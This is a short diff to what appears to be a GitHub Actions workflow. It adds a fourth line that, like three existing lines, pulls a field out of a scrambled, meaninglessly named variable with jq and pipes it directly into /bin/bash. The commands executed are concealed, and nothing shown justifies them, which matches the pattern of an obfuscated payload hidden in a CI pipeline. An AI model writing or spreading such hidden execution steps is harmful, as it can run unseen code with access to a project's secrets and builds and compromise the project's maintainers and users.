@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$xqec2449" | jq -r .hg52893 | /bin/bash
           echo $dweq9 | jq -r .p8 | /bin/bash
           printf '%s' "$sl32" | jq -r .nqw1 | /bin/bash
+          echo $z308 | jq -r .ubnbs5824 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
